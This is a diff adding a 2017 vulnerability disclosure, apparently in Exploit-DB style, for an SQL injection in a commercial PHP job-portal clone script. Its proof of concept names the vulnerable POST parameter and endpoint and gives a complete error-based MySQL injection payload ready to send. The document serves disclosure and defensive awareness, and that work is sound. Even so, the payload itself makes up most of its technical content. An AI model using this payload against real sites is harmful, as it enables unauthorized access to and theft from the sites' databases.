@@ -1,0 +1,37 @@
+# Exploit Title: Jobs2Careers / Coroflot Clone - SQL Injection
+# Date: 2017-11-30
+# Exploit Author: 8bitsec
+# Vendor Homepage: http://www.i-netsolution.com/
+# Software Link: http://www.i-netsolution.com/product/jobs2careers-coroflot-jobs-clone-script/
+# Version: 30 November 17
+# Tested on: [Kali Linux 2.0 | Mac OS 10.13.1]
+# Email: contact@8bitsec.io
+# Contact: https://twitter.com/_8bitsec
+
+Release Date:
+=============
+2017-11-30
+
+Product & Service Introduction:
+===============================
+Our readymade PHP job site script make your own job portal website set in motion.
+
+Technical Details & Description:
+================================
+
+SQL injection on [keyword] parameter.
+
+Proof of Concept (PoC):
+=======================
+
+SQLi:
+
+https://localhost/[path]/onlinejobsearch/job
+
+Parameter: keyword (POST)
+    Type: error-based
+    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
+    Payload: keyword=xxxx') AND (SELECT 6727 FROM(SELECT COUNT(*),CONCAT(0x7176707a71,(SELECT (ELT(6727=6727,1))),0x7178627671,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a) AND ('zImA'='zImA&location_name[]=
+    
+==================
+8bitsec - [https://twitter.com/_8bitsec]
